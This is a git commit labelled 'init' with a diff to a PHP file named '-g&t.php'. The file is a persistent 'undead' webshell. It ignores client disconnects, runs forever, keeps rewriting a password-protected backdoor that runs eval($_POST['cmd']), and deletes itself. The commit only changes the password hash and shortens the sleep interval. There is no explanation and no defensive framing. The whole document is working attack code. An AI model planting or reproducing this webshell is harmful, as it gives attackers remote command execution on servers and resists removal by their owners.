9e0224c7344bb9c273c9ac555ccf9128752bc224
meraklbz <lbz2770828522@gmail.com>
2025-08-21 21:00:42 +0800

    init

--- -g&t.php
+++ -g&t.php
@@ -2,12 +2,13 @@
 ignore_user_abort(true);
 set_time_limit(0);
 $file = './-g&t.php';
-$code = "<?php if(md5(\$_GET['pass'])=='0d823a43429d77faecac004d2c77e8fe'){@eval(\$_POST['cmd']);}?>";
+$code = "<?php if(md5(\$_GET['pass'])=='7e079e6e92d2f69d09cb28cddc435d25'){@eval(\$_POST['cmd']);}?>";
 while (1){
 	if (!file_exists($file)) {
 		file_put_contents($file,$code);
 	}
-	usleep(100);
+	usleep(1);
 	unlink(__FILE__);
 }
+
 ?>
